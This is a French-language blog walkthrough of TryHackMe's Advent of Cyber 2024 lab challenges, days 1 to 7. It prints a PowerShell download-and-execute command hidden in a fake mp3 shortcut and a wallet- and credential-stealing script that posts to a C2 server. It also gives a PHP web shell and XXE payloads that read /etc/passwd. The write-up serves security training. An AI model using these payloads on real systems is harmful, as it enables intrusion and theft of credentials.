---
title: Advent Of Cyber 2024
tags: [TryHackMe, Facile, Avent, Défi]
style: border
color: thm
comments: false
description: Calendrier de l'avent de la Cyber 2024
---
Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>

![Logo Événement](https://tryhackme-images.s3.amazonaws.com/room-icons/62c435d1f4d84a005f5df811-1728982657816)

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?](#jour-1--peut-être-que-la-musique-de-soc-mas-pensait-il-ne-vient-pas-dun-magasin-)
* [Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre](#jour-2--le-faux-positif-dune-personne-est-le-pot-pourri-dun-autre)
* [Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas](#jour-3--même-si-je-voulais-y-aller-leurs-vulnérabilités-ne-le-permettraient-pas)
* [Jour 4 : Je suis tout atomique à l'intérieur](#jour-4--je-suis-tout-atomique-à-lintérieur)
* [Jour 5 : *SOC-mas XX-what-ee?*](#jour-5--soc-mas-xx-what-ee)
* [Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas](#jour-6--si-je-ne-peux-pas-trouver-un-gentil-malware-à-utiliser-je-ne-le-ferai-pas)
* [Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*](#jour-7--oh-no-im-speaking-in-cloudtrail)
* [Jour 8 : Shellcodes du monde, rassemblement](#jour-8--shellcodes-du-monde-rassemblement)

## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?

![OPSEC](https://img.shields.io/badge/OPSEC-453368?logo=tryhackme)

![Jour 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730193392309.svg)

Ce premier challenge nous demande d'enquêter sur un site web de téléchargement de vidéos YouTube au format `mp3` ou `mp4` : *The Glitch's All-in-One Converter*

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_website.png" caption="Site web permettant de télécharger des vidéos YouTube" %}

Nous utilisons le lien YouTube fourni dans le texte du défi (<https://www.youtube.com/watch?v=dQw4w9WgXcQ>) afin de tester les fonctionnalités de l'outil.

Nous choisissons le téléchargement en `mp4` et nous récupérons le fichier "super sécurisé"

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_download.png" caption="Téléchargement du fichier super sécurisé" %}

Nous décompressons le fichier obtenu, et nous constatons d'abord que les fichiers sont aux formats `mp3` et non `mp4` comme souhaité.

```bash
unzip download.zip 
Archive:  download.zip
 extracting: song.mp3                
 extracting: somg.mp3
```

Une rapide analyse du fichier `song.mp3` nous indique que malgré le choix de la vidéo en entrée, nous n'avons pas été *Rick Rolled*. A la place nous avons un rap de Noël.

```bash
exiftool song.mp3 
ExifTool Version Number         : 11.88
File Name                       : song.mp3
Directory                       : .
#[...expurgé pour brièveté...]
ID3 Size                        : 2176
Artist                          : T[...expurgé...]y
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
```

En analysant de la même façon le fichier `somg.mp3` nous observons cette fois qu'il ne s'agit pas d'un fichier sonore, mais d'un lien permettant de télécharger et lancer un fichier PowerShell depuis Github

```bash
exiftool somg.mp3 
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
#[...expurgé pour brièveté...]
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
#[...expurgé pour brièveté...]
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

En nous rendant sur le lien Github, nous pouvons constater qu'il s'agit d'un script permettant de contacter un serveur C2 (*Command & Control*) entraînant la compromission de la machine à des fins de minage de cryptomonnaie

```powershell
function Print-AsciiArt {
    #[...expurgé pour brièveté...]
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    #[...expurgé pour brièveté...]
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    #[...expurgé pour brièveté...]
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://[...expurgé...].thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

En poussant l'analyse du compte Github, nous trouvons le nom de la personne qui se cache derrière le pseudo M.M.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_GithubUser.png" caption="Informations sur M.M." %}

En recherchant les *Issues* ouverts par cet utilisateur, nous trouvons un autre dépôt ayant un certain nombre de *Commits* que je ne dévoilerai pas pour conserver une part de challenge !

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_issue.png" caption="Une issue ouverte par l'utilisateur" %}

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_repo.png" caption="Le nombre de commits est la dernière question du jour" %}

## Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre

![Log analysis](https://img.shields.io/badge/Log%20analysis-314267?logo=tryhackme)

![Jour 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369227263.png)

Le défi du jour consiste en de l'analyse de log avec l'outil **Elastic**.

Nous commençons par cibler l'intervalle de temps 29/11/2024 00:00 --> 01/12/2024 23:30 comme indiqué dans l'histoire du jour.

Pour simplifier la lecture, nous choisissons d'afficher les valeurs :

* host.hostname
* user.name
* event.outcome
* event.category
* process.command_line
* source_ip

Pour trouver le compte à l'origine des connexions échouées, nous pouvons utiliser le bouton `-` pour exclure les connexions réussies et ne conserver que les échecs.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_failure.png" caption="Un seul compte à l'origine des échecs de connexions" %}

Nous observons plus de 6700 échecs sur la période indiquée.

Si nous filtrons les résultats sur l'adresse IP 10.0.11.11, nous n'observons pas de schéma particulier. En revanche, si nous excluons cette adresse, nous constatons un pic d'échecs provenant d'une autre adresse pouvant s'apparenter à une tentative de force brute.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_suspicious_ip.png" caption="Adresse IP suspecte" %}

En filtrant à présent sur les succès de cette adresse IP vers le serveur ADM-01, nous notons une connexion réussie.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_adm_success.png" caption="Connexion réussie à un serveur d'administration" %}

En regardant les actions réalisées depuis cette adresse IP suspecte, il apparaît une commande PowerShell qu'il convient de déchiffrer :

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

A première vue, il s'agit d'une commande passée en base64 mais cela ne suffit pas. A l'aide de l'outil [CyberChef](https://gchq.github.io/CyberChef/) nous pouvons déchiffrer son contenu.

Pour faciliter le déchiffrement, nous utilisons l'opération *Magic* en mode intensif qui nous permet de forcer le chiffrement supplémentaire :

```powershell
Install-WindowsUpdate -AcceptAll -AutoReboot
```

Il s'agit finalement d'un faux positif. Quelqu'un essaie a mis à jour les serveurs afin de mitiger les vulnérabilités.

## Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas

![Log analysis](https://img.shields.io/badge/Log%20analysis-453368?logo=tryhackme)

![Jour 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420330182.png)

Comme pour le défi de la veille, ce défi consiste à analyser des logs. La différence, c'est que cette fois il nous est demandé de rejouer l'attaque qui sera trouvée.

Les événements à analyser ont eu lieu le 3 octobre 2024 entre 11h30 et 12h00.

Pour faciliter la lecture, nous choisissons d'afficher les champs suivants :

* clientip
* message

La première étape consiste à trouver le chemin du fichier `shell.php` qui a été téléversé. Pour cela, nous utiliserons la requête KQL (Kibana Query Language) : `message:"shell.php"`

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_shell.png" caption="Informations concernant le shell et l'adresse IP qui l'a utilisé" %}

Nous allons à présent utiliser le code {% include dictionary.html word="PHP" %} fourni dans le défi pour reproduire l'attaque {% include dictionary.html word="RCE" %} observée.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

Ce code permet de créer une page web contenant un champ dans lequel nous pourrons entrer notre commande, et qui nous affichera la réponse en dessous.

Nous commençons par accéder à l'url `hxxp[://]frostypines[.]thm/admin/rooms[.]php`, là où nous avons observé la première occurrence de `shell.php`.

Grâce à l'analyse des logs, nous savons que le shell a été uploadé en tant qu'image pour illustrer une chambre à louer sur le site. Nous allons donc créer une nouvelle chambre afin de pouvoir déposer notre fichier.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell.png" caption="Création d'une nouvelle chambre avec la page PHP" %}

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell2.png" caption="Chambre créée" %}

Nous pouvons désormais accéder à notre shell via l'url `hxxp[://]frostypines[.]thm/[...expurgé...]/shell[.]php`

En listant les éléments présents dans le dossier actuel, nous y trouvons le fichier `flag.txt` que nous devons trouver

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_list.png" caption="Le fichier flag.txt est présent dans le dossier" %}

Nous pouvons lire le contenu du fichier pour conclure ce troisième jour.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_flag.png" caption="Le flag concluant le défi" %}

## Jour 4 : Je suis tout atomique à l'intérieur

![Atomic Red Team](https://img.shields.io/badge/Atomic%20Red%20Team-453368?logo=tryhackme)

![Jour 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730709355879.png)

Les objectifs du jour sont d'identifier des techniques malicieuses avec le framework [MITRE ATT&CK](https://attack.mitre.org/), utiliser les tests [*Atomic Red Team*](https://www.atomicredteam.io/) pour mener des simulations d'attaques et créer des règles d'alerte et de détection basées sur ces tests.

Pour mener à bien les exercices du jour, il faut suivre la documentation afin de découvrir le fonctionnement des outils comme *Atomic Red Team*

La première étape consiste à vérifier si nous avons les bons prérequis pour exécuter notre premier test.

```txt
Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
CheckPrereq's for: T1566.001-1 Download Macro-Enabled Phishing Attachment
Prerequisites met: T1566.001-1 Download Macro-Enabled Phishing Attachment
```

Après avoir nettoyer les logs de l'outil [Sysmon](https://learn.microsoft.com/fr-fr/sysinternals/downloads/sysmon), nous lançons le test.

De retour dans l'outil Event Viewer, dans le dossier Sysmon, nous observons la présence d'un événement ayant créé deux fichiers, dont un est le flag de la première question.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_sysmon.png" caption="Logs de la création des outils de phishing" %}

Nous récupérons le contenu du fichier texte créé :

```txt
Get-Content 'C:\Users\Administrator\AppData\Local\temp\PhishingAttachment.txt'
THM{[...expurgé...]}
```

Pour trouver quel identifiant ATT&CK est en jeu, nous nous rendons dans la section [*Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_mitre.png" caption="Sélection de la catégorie MITRE" %}

Le numéro de la catégorie apparaît dans l'encadré récapitulant la technique :

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_CSI.png" caption="Informations sur la technique Command and Scripting Interpreter" %}

En ouvrant les différentes sous-techniques associées nous trouvons celle qui est dédiée à Windows Command Shell :

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_subtechnique.png" caption="Sous-technique applicable à Windows Command Shell" %}

Pour trouver le nom du test Atomic à simuler, nous utilisons la commande `Invoke-AtomicTest` avec le flag `-ShowDetailsBrief`

```txt
Invoke-AtomicTest T[...expurgé...] -ShowDetailsBrief
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[...expurgé...]-1 Create and Execute Batch Script
[...expurgé...]-2 Writes text to a file and displays it.
[...expurgé...]-3 Suspicious Execution via Windows Command Shell
[...expurgé...]-4 [...expurgé...]
[...expurgé...]-5 Command Prompt read contents from CMD file and execute
```

McSkidy souhaitant mettre en place un test imitant un *ransomware*, le test numéro **4** est celui qui sera joué.

En regardant les détails de ce test, nous pouvons trouver le nom du fichier qui sera nécessaire :

```txt
Invoke-AtomicTest T[...expurgé...] -TestNumbers 4 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Command and Scripting Interpreter: Windows Command Shell T[...expurgé...]
Atomic Test Name: [...expurgé...]
Atomic Test Number: 4
Atomic Test GUID: 6b2903ac-8f36-450d-9ad5-b220e8a2dcb9
Description: This test attempts to open a file a specified number of times in Wordpad, then prints the contents.  It is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed.  See https://redcanary.com/blog/blackbyte-ransomware/.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
cmd /c "for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}" | Out-null
Command (with inputs):
cmd /c "for /l %x in (1,1,1) do start wordpad.exe /p C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt" | Out-null

Cleanup Commands:
Command:
stop-process -name wordpad -force -erroraction silentlycontinue

Dependencies:
Description: File to print must exist on disk at specified location (C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt)
Check Prereq Command:
if (test-path "#{file_to_print}"){exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (test-path "C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt"){exit 0} else {exit 1}
Get Prereq Command:
new-item #{file_to_print} -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
Get Prereq Command (with inputs):
new-item C:\Tools\AtomicRedTeam\atomics\T[...expurgé...]\src\[...expurgé...].txt -value "This file has been created by T[...expurgé...] Test 4" -Force | Out-Null
[!!!!!!!!END TEST!!!!!!!] 
```

Nous lançons la simulation, et à la fin nous avons un prompt nous proposant d'enregistrer un fichier PDF. Lorsque nous l'ouvrons, nous obtenons le dernier flag pour ce jour.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-04_flag.png" caption="Drapeau trouvé dans le fichier PDF créé à la fin du test" %}

## Jour 5 : *SOC-mas XX-what-ee?*

![XXE](https://img.shields.io/badge/XXE-4d354a?logo=tryhackme)

![Jour 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730807266344.png)

L'exercice du jour consiste à injecter un XXE (**X**ML E**X**ternal **E**ntity) afin d'obtenir des informations contenues sur le serveur, mais qui devrait être inaccessibles pour les utilisateurs.

Cette technique consiste à préparer une charge (*payload*) et l'ouvrir via la requête HTTP habituellement utilisée.

Par exemple, si la requête initiale ressemble à :

```xml
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

Nous pouvons la modifier de telle façon pour pouvoir obtenir les informations des comptes présents sur le serveur :

```xml
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

En ajoutant le `DOCTYPE` et l'`ENTITY` nous pouvons ouvrir le fichier système `/etc/passwd` grâce à la variable `thmFile` que nous avons défini.

Pour commencer, nous accédons au site de vente de produits de Noël, nous ajoutons un objet dans notre *wishlist* et nous nous rendons dans notre panier (*Cart*) pour valider.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_cart.png" caption="Wishlist créée à valider" %}

Lorsque nous procédons au *Checkout*, le site nous indique que nous venons de créer le 21ème vœu. Mais lorsque nous cliquons sur le lien, nous avons un message d'erreur indiquant que seuls les elfes du Père Noël ont accès aux vœux.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_wish.png" caption="Notre panier est enregistré en tant que 21ème souhait" %}

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-05_error.png" caption="Nous n'avons pas accès à nos souhaits" %}

Par chance, nous avons utilisé [Burp Suite](https://portswigger.net/burp) afin d'intercepter les requêtes {% include dictionary.html word="HTTP" %}. L'outil nous permet de constater qu'une action sur la page `/wishlist.php` utilise le format {% include dictionary.html word="XML" %}.

```http
POST /wishlist.php HTTP/1.1
Host: 10.10.75.70
Content-Length: 215
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://10.10.75.70
Referer: http://10.10.75.70/product.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=s362bk13rtm6nqecg4b7ifdgin
Connection: keep-alive

<wishlist>
    <user_id>1</user_id>
    <item>
        <product_id>1</product_id>
    </item>
</wishlist>
```

Nous envoyons cette requête dans le *Repeater* de Burp, et nous modifions la partie {% include dictionary.html word="XML" %} de la manière suivante afin de vérifier si nous avons accès à notre *wishlist*:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY charge SYSTEM "/var/www/html/wishes/wish_21.txt"> ]>
<wishlist>
    <user_id>
        1
    </user_id>
    <item>
        <product_id>
            &charge;
        </product_id>
    </item>
</wishlist>
```

Nous obtenons bien notre panier :

```http
HTTP/1.1 200 OK
Date: Sat, 14 Dec 2024 10:26:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 213
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The product ID: Wish #21
Name: Christmas Hacker
Address: Somewhere on Internet
---------------------------------------
Product: Wareville's Jolly Cap
Quantity: 1
---------------------------------------
is invalid.
```

Puisqu'il y a 20 autres souhaits avant le nôtre dans le dossier, nous envoyons cette requête vers la partie *Intruder* de Burp afin d'automatiser la recherche.

Nous positionnons la cible (entre les symboles `§`) sur le numéro du fichier `wish_§21§.txt`, un type de *Payload* "*Numbers*" de 1 à 20

Une fois l'attaque effectuée, nous constatons que la longueur de la 15ème réponse est significativement plus longue que les autres. En l'analysant, nous y trouvons un flag :

```http
HTTP/1.1 200 OK
Date: Sat, 14 Dec 2024 10:31:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 224
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The product ID: Wish #15
Name: Mayor Malware
Address: Test
---------------------------------------
Product: Waredy Cane
Quantity: 1
---------------------------------------
PS: The flag is THM{[...expurgé..]}
is invalid.
```

Nous accédons à présent à la page de `CHANGELOG` pour trouver l'origine de cette vulnérabilité, et nous constatons un commit récent accompagné d'un flag.

```txt
commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
Author: Mayor Malware - Wareville <mayor@wareville.org>
Date:   Wed Dec 4 21:24:22 2024 +0200

    Fixed the wishlist.php page THM{[...expurgé...]}

[...expurgé pour brièveté...]
```

## Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas

![Sandboxes](https://img.shields.io/badge/Sandboxes-314267?logo=tryhackme)

![Jour 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730728443161.png)

Au programme de ce sixième jour, nous allons découvrir ce que nous pouvons faire pour piéger des malwares capables de détecter s'ils sont testés dans une *sandbox*, machine virtuelle sécurisée permettant de tester le fonctionnement et le comportement de programmes afin de déterminer leur dangerosité.

Comme indiqué dans le déroulé de la journée, nous commençons par lancer le script `JingleBells.ps1` qui est une règle de détection [YARA](https://en.wikipedia.org/wiki/YARA) destinée à détecter les malwares analysant leur environnement et se faire discret en cas d'utilisation en *sandbox*. Un tel malware apparaîtrait fiable en *sandbox* et pourrait être distribué sur des machines physiques où il causerait des dégâts.

Grâce à ce script, nous obtenons bien une alerte lorsque le malware `MerryChristmas.exe` est lancé.

```txt
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp176D.tmp
Logging to file: C:\Tools\YaraMatches.txt
Event Time: 12/14/2024 10:53:07
Event ID: 1
Event Record ID: 127857
Command Line: reg  query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp176D.tmp
--------------------------------------


Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
1      Job1            BackgroundJob   Running       True            localhost            ...
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB.tmp
Logging to file: C:\Tools\YaraMatches.txt
Event Time: 12/14/2024 10:53:07
Event ID: 1
Event Record ID: 127856
Command Line: C:\Windows\system32\cmd.exe /c reg query "HKLM\Software\Microsoft\Windows\CurrentVersion" /v ProgramFilesDir
YARA Result: SANDBOXDETECTED C:\Users\Administrator\AppData\Local\Temp\2\tmp1FAB.tmp
--------------------------------------
3      Job3            BackgroundJob   Running       True            localhost            ...
```

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-06_yara.png" caption="Message d'alerte et flag" %}

Nous lançons à présent le programme `floss.exe` qui nous permettra d'extraire les chaînes de caractères présentes dans le malware

```powershell
floss.exe C:\Tools\Malware\MerryChristmas.exe | Out-File C:\Users\Administrator\Desktop\malstring.txt
```

En analysant le document créé à la recherche des lettres `THM` nous trouvons le flag caché dans le malware :

```powershell
Get-Content C:\Users\Administrator\Desktop\malstring.txt | Select-String THM
THM{[...expurgé...]}
```

## Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*

![AWS log analysis](https://img.shields.io/badge/AWS%20log%20analysis-314267?logo=tryhackme)

![Jour 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730384938554.png)

AWS (pour *Amazon Web Services*) est un fournisseur de services basé sur le *Cloud*. Cette épreuve consiste à analyser les logs de la plateforme afin de trouver des manipulations potentiellement frauduleuses.

Nous commençons l'analyse par la commande suivante, et nous y trouvons les actions menés par l'utilisateur `glitch` qui nous est indiqué comme "anormal", son adresse IP, et le service AWS permettant de se connecter à la console ainsi que la date à laquelle cette connexion est intervenue :

```bash
jq -r '["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

Event_Time            Event_type        Event_Name                           Event_Source                         User_Name  Source_IP        User_Agent
2024-11-28T15:22:12Z  AwsApiCall        HeadBucket                           s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:23Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:25Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-192.879.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:39Z  AwsApiCall        [...expurgé...]                      s3.amazonaws.com                     glitch     [...expurgé...]  [Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36]
2024-11-28T15:22:44Z  AwsApiCall        ListObjects                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-193.880.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
[...expurgé...]       AwsConsoleSignIn  ConsoleLogin                         [...expurgé...]                      glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        ListEnrollmentStatuses               cost-optimization-hub.amazonaws.com  glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:22:12Z  AwsApiCall        ListBuckets                          s3.amazonaws.com                     glitch     [...expurgé...]  [S3Console/0.4, aws-internal/3 aws-sdk-java/1.12.750 Linux/5.10.226-193.880.amzn2int.x86_64 OpenJDK_64-Bit_Server_VM/25.412-b09 java/1.8.0_412 vendor/Oracle_Corporation cfg/retry-mode/standard]
2024-11-28T15:22:14Z  AwsApiCall        GetStorageLensConfiguration          s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
2024-11-28T15:22:14Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
2024-11-28T15:22:13Z  AwsApiCall        GetStorageLensDashboardDataInternal  s3.amazonaws.com                     glitch     AWS Internal     AWS Internal
2024-11-28T15:21:57Z  AwsApiCall        DescribeEventAggregates              health.amazonaws.com                 glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
2024-11-28T15:21:57Z  AwsApiCall        GetCostAndUsage                      ce.amazonaws.com                     glitch     [...expurgé...]  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```

Explications de la commande :

|Commande|Utilité|
|:--:|:--:|
|`["Event_Time", "Event_type", "Event_Name", "Event_Source", "User_Name", "Source_IP", "User_Agent"]`| Défini les entêtes qui seront affichées|
|`.Records[] | select(.userIdentity.userName == "glitch")`| Récupérer les entrées pour l'utilisateur `glitch`|
|`[.eventTime, .eventType, .eventName, .eventSource, .userIdentity.userName //"N/A", .sourceIPAddress //"N/A", .userAgent //"N/A"]`|Sélectionner les informations souhaitées (remplacer par "N/A" si vide)|
|`@tsv`|Convertir en tableau dont les colonnes sont séparées par des tabulations|
|`column -t -s $'\t'`| Afficher sous la forme de colonnes délimitées par des tabulations|

